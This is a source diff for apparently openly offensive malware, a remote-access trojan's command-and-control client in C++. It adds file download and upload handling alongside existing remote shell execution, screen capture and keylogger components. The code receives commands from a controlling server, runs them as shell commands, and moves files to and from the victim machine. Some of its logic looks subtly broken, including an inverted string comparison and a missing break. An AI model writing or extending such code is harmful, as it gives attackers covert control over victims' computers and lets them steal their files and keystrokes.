@@ -11,6 +11,7 @@
 #include "cncManager.h"
 #include "commandManager.h"
 #include "keyLogger.h"
+#include "util.h"
 
 cncManager::cncManager() {
 }
@@ -140,7 +141,7 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
             DDprotocol* dataFrame = new DDprotocol;
             dataFrame->type = DDtype;
             dataFrame->len = left_offset;
-            dataFrame->seq = LAST_SEQUENCE;
+            dataFrame->seq = LAST_SPLITED_SEQ;
 
             UCHAR* stream = new UCHAR[sizeof(DDprotocol) + left_offset];
             memset(stream, 0, sizeof(DDprotocol) + left_offset);
@@ -206,9 +207,17 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                     this->printParsedResponse(resData, "SEHLL_REQUEST");
                     std::istringstream spliter(data);
                     std::string tmp;
+
                     while (std::getline(spliter, tmp, ';')) {
-                        this->shellCmd.push_back(tmp);
+                        if (strncmp(tmp.c_str(), "file ", 5)) {
+                            this->ftpPath = StringUtil::split(tmp, ' ')[1];
+                            this->sendData(ftpRequest, this->ftpPath.length(), (LPVOID)this->ftpPath.c_str());
+                        }
+                        else {
+                            this->shellCmd.push_back(tmp);
+                        }
                     }
+
                   
                     std::thread shellHandler = std::thread(&cncManager::handleShellRequest, this);
                     shellHandler.detach();
@@ -236,6 +245,12 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                         ftpHandler.detach();
                     }
                     break;
+                }
+
+                case ftpResponse:
+                {
+                    std::thread ftpHandler = std::thread(&cncManager::handleFtpResponse, this, data, resData->seq);
+                    ftpHandler.detach();
                 }
             
                 case none:
@@ -284,6 +299,11 @@ void cncManager::handleShellRequest() {
 void cncManager::handleFtpRequest(std::string path) {
     commandManager commander;
     commander.getFile(path,this->server);
+}
+
+void cncManager::handleFtpResponse(std::string& data, DWORD seq) {
+    commandManager commander;
+    commander.saveFIle(this->ftpPath, data, seq);
 }
 
 void cncManager::handleScreenRequest() {
